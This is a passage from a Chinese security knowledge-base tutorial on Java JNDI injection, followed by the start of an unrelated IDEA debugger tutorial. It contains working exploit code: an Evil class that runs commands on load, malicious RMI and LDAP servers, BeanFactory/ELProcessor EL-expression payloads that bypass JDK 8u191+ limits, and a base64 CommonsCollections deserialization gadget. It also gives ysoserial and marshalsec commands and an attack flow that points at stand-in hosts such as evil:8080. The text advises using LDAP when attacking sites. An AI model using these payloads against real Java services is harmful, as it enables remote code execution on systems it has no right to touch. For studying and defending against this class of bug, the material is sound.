文件来进行实例化。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性： className：远程加载时所使用的类名； classFactory：加载的class中需要实例化类的名称； classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议； 当然，要把一个对象绑定到RMI注册表中，这个对象需要继承UnicastRemoteObject，但是Reference没有继承它，所以我们还需要封装一下它，用 ReferenceWrapper 包裹一下Reference实例对象，这样就可以将其绑定到RMI注册表，并被远程访问到了 // 第一个参数是远程加载时所使用的类名 // 第二个参数是要加载的类的完整类名(这两个参数可能有点让人难以琢磨，往下看你就明白了） // 第三个参数就是远程class文件存放的地址了 Reference refObj = new Reference(\"refClassName\", \"insClassName\", \"http://example.com:8888/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); registry.bind(\"refObj\", refObjWrapper); 当有客户端通过lookup(\"refObj\")获取远程对象时，获取的是一个Reference存根（Stub),由于是Reference的存根，所以客户端会现在本地的classpath中去检查是否存在类refClassName，如果不存在则去指定的url（http://example.com:8888/refClassName.class）动态加载，并且调用`insClassName`的**无参构造函数**，所以**可以在构造函数里写恶意代码。当然除了在无参构造函数中写利用代码，还可以利用java的 static代码块 来写恶意代码，因为static代码块的代码在class文件被加载过后就会立即执行，且只执行一次。** 了解更多关于static代码块，参考：https://www.cnblogs.com/panjun-donet/archive/2010/08/10/1796209.html JNDI注入 JNDI注入原理 就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行 JNDI注入的利用条件 客户端的lookup()方法的参数可控 服务端在使用Reference类时，classFactoryLocation参数可控 上面两个都是在编写程序时可能存在的脆弱点（任意一个满足就行），除此之外，jdk版本在JNDI注入中也起着至关重要的作用，而且不同的攻击Payload对jdk的版本要求也不一致，这里就全部列出来： JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端JVM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 可以看出RMI的Codebase限制明显比LDAP多，所以我们在日站的时候，最好也是用LDAP来进行注入。 JNDI注入攻击流程 攻击者通过可控url触发动态协议转换(rmi://attack:1090/Exploit) 受害者服务器原上下文环境被转换为rmi://attack:1090/Exploit 受害者服务器去rmi://attack:1090/Exploit请求绑定对象Exploit，攻击者实现准备好的RMI服务器返回一个ReferenceWrapper对象(Reference(\"Class1\",\"Class2\",\"http://evil:8080/\")) 应用获取到ReferenceWrapper开始在本地查找Class1，发现无，则去请求http://evil:8080/Class2.class web服务器返回事先准备好的恶意class文件，受害者服务器调用Class2的构造方法，恶意代码执行 JNDI注入举例 创建恶意类Evil（不能带package） import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.Hashtable; public class Evil implements ObjectFactory { // 实现接口ObjectFactory，不然会报错，虽然不影响执行 public Evil() throws IOException { // 构造方法，加载时会自动调用 exec(\"open -na Calculator\"); } public static void exec(String cmd) throws IOException { Process runcmd = Runtime.getRuntime().exec(cmd); InputStreamReader inputStreamReader = new InputStreamReader(runcmd.getInputStream()); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String tmp; while ((tmp = bufferedReader.readLine()) != null){ System.out.println(tmp); } inputStreamReader.close(); bufferedReader.close(); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } 常见RMI服务端，绑定恶意的Reference到rmi注册表 package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import javax.naming.Reference; import java.io.IOException; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class App { public static void main(String[] args) throws IOException, NamingException { //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL,\"rmi://127.0.0.1:1099\"); //初始化环境 InitialContext ctx = new InitialContext(env); // 创建一个注册表 LocateRegistry.createRegistry(1099); // 绑定恶意的Reference到rmi注册表 // 注意，classFactoryLocation地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码 Reference reference = new Reference(\"Evil\", \"Evil\", \"http://127.0.0.1:8888/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); ctx.bind(\"evil\", referenceWrapper); } } 客户端远程调用evil对应类 package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", String.valueOf(true)); // 参考上面的利用条件，低版本不需要设置 System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", String.valueOf(true)); // 参考上面的利用条件，低版本不需要设置 //初始化环境 InitialContext init = new InitialContext(); // 远程调用evil，然后找不到服务端类Evil，就会调用http://127.0.0.1:8888/Evil.class init.lookup(\"rmi://127.0.0.1:1099/evil\"); } } 步骤 启动RMI服务端 编译Evil.java为Evil.class，并启动http服务 客户端运行，远程调用evil JNDI注入Debug 在lookup下断点进行分析 堆栈调用情况 首先调用InitialContext.lookup，getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象，然后在对应协议中去lookup搜索 然后就会调用GenericURLContext.lookup()方法，此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址，不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext，进入不同的协议路线。 public Object lookup(String var1) throws NamingException { // 获取rmi注册中心的相关数据 ResolveResult var2 = this.getRootURLContext(var1, this.myEnv); // 获取注册中心对象 Context var3 = (Context)var2.getResolvedObj(); Object var4; try { // 去注册中心lookup，进入此处 lookup var4 = var3.lookup(var2.getRemainingName()); } finally { var3.close(); } return var4; } 跟进lookup，此处调用的是RegistryContext.lookup() 其中从RMI注册表中lookup查询到服务端中目标类的Reference后返回一个ReferenceWrapper_Stub类实例，该类实例就是客户端的存根、用于实现和服务端进行交互，最后调用decodeObject()函数来解析 然后跟进RegistryContext.decodeObject，先判断入参ReferenceWrapper_Stub类实例是否是RemoteReference接口实现类实例，而ReferenceWrapper_Stub类正是实现RemoteReference接口类的，因此通过判断调用getReference()来获取到ReferenceWrapper_Stub类实例中的Reference即我们在恶意RMI注册中绑定的恶意Reference；再往下调用NamingManager.getObjectInstance()来获取远程服务端上的类实例 继续跟NamingManager.getObjectInstance() 进入getObjectFactoryFromReference，到loadClass()时，就会向工厂请求恶意的class 然后看到了熟悉的newInstance()（实例化），想想写的Evil.java 只有一个构造函数，实例化之后，就会执行构造函数中的恶意代码。 实例化后： 继续跟，getObjectFactoryFromReference()返回的类需要为ObjectFactory，所以这里也是为什么我们的恶意类要实现ObjectFactory这个接口，不然会报错，但是不影响执行。 绕过高版本JDK（8u191+）限制 如何绕过高版本JDK的限制进行JNDI注入利用 绕过高版本JDK（8u191+）限制 Exploitng JNDI Injection In Java 由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 两种绕过方法如下： 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。 简单地说，在低版本JDK的JNDI注入中，主要利用的就是classFactoryLocation这个参数来实现远程加载类利用的。但是在高版本JDK中对classFactoryLocation这个途径实现了限制，但是对于classFactory这个参数即本地ClassPath中如果存在Gadget的话还是能够进行JNDI注入攻击的。 我们先来看一些基本概念，然后再分析这两种绕过方法。 关于Codebase Oracle官方关于Codebase的说明：https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。 当对象发送序列化数据时，会在序列化流中附加上Codebase的信息，这个信息告诉接收方到什么地方寻找该对象的执行代码。Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。在大多数情况下，你可以在命令行上通过属性 java.rmi.server.codebase 来设置Codebase。 例如，如果所需的类文件在Evil的根目录下，那么设置Codebase的命令行参数如下（如果你把类文件打包成了jar，那么设置Codebase时需要指定这个jar文件）： -Djava.rmi.server.codebase=http://url:8080/ 当接收程序试图从该URL的Evil上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件： http://url:8080/com/project/test.class 关于JNDI Naming Reference的限制 如前文所述，JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。 NamingManager.java static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException { Class clas = null; // Try to use current class loader try { clas = helper.loadClass(factoryName); } catch (ClassNotFoundException e) { // ignore and continue // e.printStackTrace(); } // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null && (codebase = ref.getFactoryClassLocation()) != null) { try { clas = helper.loadClass(factoryName, codebase); } catch (ClassNotFoundException e) { } } return (clas != null) ? (ObjectFactory) clas.newInstance() : null; } 代码中会先尝试在本地CLASSPATH中加载类，不行再从Codebase中加载，codebase的值是通过ref.getFactoryClassLocation()获得。 public Class loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException { ClassLoader parent = getContextClassLoader(); ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent); return loadClass(className, cl); } 最后通过 VersionHelper12.loadClass() 中 URLClassLoader 加载了远程class。所以java.rmi.server.useCodebaseOnly不会限制JNDI Reference的利用，有影响的是高版本JDK中的这几个系统属性： com.sun.jndi.rmi.object.trustURLCodebase com.sun.jndi.cosnaming.object.trustURLCodebase com.sun.jndi.ldap.object.trustURLCodebase 做个实验，我们在JDK1.8.0_181下使用 RMI Server 构造恶意的JNDI Reference进行JNDI注入，报错如下： Exception in thread \"main\" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'. at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495) at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) at javax.naming.InitialContext.lookup(InitialContext.java:417) 而此时使用LDAP Server返回恶意Reference是可以成功利用的，因为JDK 8u191以后才对LDAP JNDI Reference进行了限制。 绕过高版本JDK限制：利用本地Class作为Reference Factory 在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class； 这个工厂类必须在受害目标本地的CLASSPATH中 工厂类必须实现 javax.naming.spi.ObjectFactory 接口 至少存在一个 getObjectInstance() 方法 org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。 该类在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。 利用举例 根据beanFactory的代码逻辑，要求传入的Reference为ResourceRef类，这个情况下，目标Bean Class必须有一个无参构造方法，有public的setter方法且参数为一个String类型。事实上，这些setter不一定需要是set..开头的方法，根据org.apache.naming.factory.BeanFactory中的逻辑，我们可以把某个方法强制指定为setter。 然后大佬们找到了javax.el.ELProcessor可以作为目标Class。 pom.xml（双方均需要） org.apache.tomcat tomcat-catalina 8.5.0 org.apache.el com.springsource.org.apache.el 7.0.26 Server package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.NamingException; import javax.naming.StringRefAddr; import java.io.IOException; import java.rmi.AlreadyBoundException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class App { public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); System.out.println(\"RMI LISTEN PORT 1099\"); // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null); // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码 ref.add(new StringRefAddr(\"forceString\", \"x=eval\")); // 利用表达式执行命令 ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/System/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\\\")\")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); registry.bind(\"Exploit\", referenceWrapper); } } Client package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { //初始化环境 InitialContext init = new InitialContext(); // 寻找Exploit，然后会执行EL表达式 init.lookup(\"rmi://127.0.0.1:1099/Exploit\"); } } 几种变体的表达式 前面的恶意表达式就是通过反射的方式来实现命令执行的，本地测试有如下几种变体，原理都是基于反射调用任意类方法： import javax.el.ELProcessor; public class Test { public static void main(String[] args) { String poc = \"''.getClass().forName('javax.script.ScriptEngineManager')\" + \".newInstance().getEngineByName('nashorn')\" + \".eval(\\\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\"; // String poc = \"''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())\" + // \".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')\" + // \".invoke(null),'calc.exe')}\"; // String poc = \"''.getClass().forName('javax.script.ScriptEngineManager')\" + // \".newInstance().getEngineByName('JavaScript')\" + // \".eval(\\\"java.lang.Runtime.getRuntime().exec('calc')\\\")\"; new ELProcessor().eval(poc); } } Debug分析 因为org.apache.naming.factory.BeanFactory 类在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。所以重点分析getObjectInstance() RegistryContext.lookup对RMI registry发请求,反序列获取到ReferenceWrapper_Stub，然后把反序列得到的ReferenceWrapper_Stub传给decodeObject() 跟进decodeObject，首先给获取到的var1 ReferenceWrapper_Stub调用getReference()方法，getReference方法通过获取ReferenceWrapper_Stub的ref属性然后发请求, 反序列请求结果得到真正绑定到RMI Registry上的对象(ResourceRef), 然后传给NamingManager.getObjectInstance()方法。 首先类型转换将object转换为Reference对象 然后ref.getFactoryClassName() 获取FactoryClassName，返回的是Reference对象的classFactory属性，然后传递到getObjectFactoryFromReference中，然后loadClass加载我们传入的org.apache.naming.factory.BeanFactory类, 再newInstance实例化该类并将其转换成ObjectFactory类型。 然后直接调用ObjectFactory接口实现类实例的getObjectInstance()函数，这里是BeanFactory类实例的getObjectInstance()函数 跟进BeanFactory.getObjectInstance，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例 接着获取Bean类为javax.el.ELProcessor后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的x=eval内容： 继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！之后，就是获取beanClass即javax.el.ELProcessor类的eval()方法并和x属性一同缓存到forced这个HashMap中 接着是多个do while语句来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素 获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行恶意的EL表达式。 总结 这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是org.apache.naming.factory.BeanFactory； 由于org.apache.naming.factory.BeanFactory类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的javax.el.ELProcessor类； ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为forceString、内容为x=eval的StringRefAddr类实例，这里看org.apache.naming.factory.BeanFactory类的getObjectInstance()方法源码发现，程序会判断是否存在=号，若存在则将x属性的默认setter方法设置为我们eval；第二次是类型为x、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的x属性关联起来，x属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用javax.el.ELProcessor类的eval()函数执行恶意表达式从而达到攻击利用的目的 绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。 如果服务端ClassPath中存在反序列化漏洞多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。 利用举例 生成POC 假设目标系统中存在着有漏洞的CommonsCollections库，使用ysoserial生成一个CommonsCollections的利用Payload java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 \"open -na Calculator\" | base64 LDAP Server package org.example; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import com.unboundid.util.Base64; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class App { private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) { String url = \"http://127.0.0.1:8888/#Exploit\"; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; /** * */ public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult (InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos > 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: 利用LDAP+Reference Factory // e.addAttribute(\"javaCodeBase\", cbstring); // e.addAttribute(\"objectClass\", \"javaNamingReference\"); // e.addAttribute(\"javaFactory\", this.codebase.getRef()); // Payload2: 返回序列化Gadget try { e.addAttribute(\"javaSerializedData\", Base64.decode(\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABNvcGVuIC1uYSBDYWxjdWxhdG9ydAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=\")); } catch (ParseException exception) { exception.printStackTrace(); } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } Client package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { //初始化环境 InitialContext init = new InitialContext(); init.lookup(\"ldap://127.0.0.1:1389/Exploit\"); } } Debug分析 调用栈 前面的函数调用链都是不同类lookup()函数之间的调用，com.sun.jndi.ldap.LdapCtx类的c_lookup()函数中会调用到com.sun.jndi.ldap.Obj类的decodeObject()函数进行解码对象的操作。 跟进去，先调用getCodebases()函数从JAVA_ATTRIBUTES中取出索引为4即javaCodeBase的内容，由于本次并没有设置这个属性因此返回null即下面Variables框中的var1(slot_2)变量；然后从JAVA_ATTRIBUTES中取出索引为1即javaSerializedData的内容，这个我们是在恶意LDAP服务端中设置了的、内容就是恶意的Commons-Collections这个Gadget的恶意利用序列化对象字节流，对应的是下面Variables框中的var2 (slot_1)变量；这里var1(slot_2)变量为null，传入getURLClassLoader()函数调用后返回的是AppClassLoader即应用类加载器；再往下就是调用deserializeObject()函数来反序列化javaSerializedData的对象字节码 其中，静态变量JAVA_ATTRIBUTES的内容如下： 建议 实战中可以使用marshalsec方便的启动一个LDAP/RMI Ref Server： java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer # [] Example: java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://8.8.8.8:8090/#Exploit 8088 参考 关于 JNDI 注入 JNDI注入入门 浅析JNDI注入 who is JNDI？ Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-27 14:45:00 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/06.IDEA断点调试.html","title":"06.IDEA断点调试","keywords":"","body":" 前言 控制面板 断点 什么是断点 断点参数（断点属性） 断点的种类 Line breakpoint（行断点） Temporary line breakpoint（临时行断点） Field watchpoint（属性断点） Method breakpoint（方法断点） Exception breakpoint（异常断点） 条件断点 前言 代码审计过程中肯定是需要下断点让程序暂停进行分析的，所以很重要！！！ 调试技能重要性甚⾄超过学习⼀门语⾔:hotsprings: 本文主要是针对IDEA进行断点调试，IDEA YYDS 在调试代码的时候，你的项目得debug模式启动，也就是点那个绿色的甲虫启动服务器，然后，就可以在代码里面断点调试啦。 控制面板 参考https://blog.csdn.net/f641385712/article/details/93145454 大多数说明图片就直接Copy过来的，不足点再添加补充说明 进入断点管理界面 说明 断点 什么是断点 断点你可能天天都在使用，但是若真要你对它下定义，估计一时间还有点懵逼呢有木有？ 断点：是一种附加在源代码上面的特殊标记，在调试模式(debug模式)下可以触发特定的动作，比如打印线程调用栈信息、计算值、打印指定表达式的值等等。 Tips：断点一但设置就会一直保存在工程中直到手动删除~ 断点参数（断点属性） 断点并不是仅仅是孤立的存在的，它也可以通过参数进行定制化，这些叫断点参数。 不同类型的断点支持的断点参数也不尽相同，在下面具体介绍时会详细说明~ 断点的种类 据我粗略调查，80%的小伙伴打断点只会采用代码行左边鼠标单击这种最基础的方式打断点然后调试。其实在现实场景中，有非常非常多的情况下，这种方式将很难快速定位到问题所在，因此了解断点分类、调试技巧就显得有点必须了 殊不知，IDEA给我们提供了丰富的断点类型，让我们能够在不同的调试场景下，使用不同的断点类型来大大提高我们的调试效率，毕竟效率就是时间，而时间就是生命。 从idea断点对话框里也能够看出断点是分类的。然后下面我对断点的分类讲解不是完全按此分类，我的分类会更加详细如下： Line breakpoint（行断点）：在指定代码行设置断点，属于行级别的断点 Temporary line breakpoint（临时行断点）：与行断点类似，不同之处在于该类型的断点在被激活之后会被立即删除 Field watchpoint（属性断点）：读取或者修改属性时会激活属性断点 Method breakpoint（方法断点）：它是标记在方法那一行的断点，有自己特有的属性参数 Exception breakpoint（异常断点）：当程序抛出指定异常时会激活异常断点。与行断点不同，异常断点不需要与源代码映射（不需要打在具体某一行代码上），因为异常断点应用程序级别的 Line breakpoint（行断点） 这是使用得最为广泛的一种断点。示例操作“视频“： 断点参数 作为第一个介绍的断点类型，这里有必要全面的解释一下上面行断点操作的断点参数： Suspend：有没有让你诧异到，它竟然是个复选框并且还可以不被选中。若它不被选中的话断点的相关动作依然激活执行，只是线程不会被组塞了而已。它的两种阻塞策略如下： 